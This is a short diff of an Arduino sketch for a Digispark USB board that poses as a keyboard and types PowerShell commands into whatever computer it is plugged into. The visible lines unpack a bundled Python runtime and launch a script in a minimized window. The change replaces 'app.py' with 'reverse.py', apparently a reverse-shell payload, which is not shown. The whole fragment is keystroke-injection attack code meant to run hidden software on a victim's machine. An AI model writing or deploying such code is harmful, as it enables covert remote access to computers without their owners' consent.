@@ -16,7 +16,7 @@ void setup() {
 	DigiKeyboard.println("Expand-Archive -Force python-w32.zip -DestinationPath App");
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.delay(500);
-	DigiKeyboard.println("cd App\\python-w32; Start-Process -WindowStyle Minimized .\\python app.py; exit");
+	DigiKeyboard.println("cd App\\python-w32; Start-Process -WindowStyle Minimized .\\python reverse.py; exit");
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	  
 }
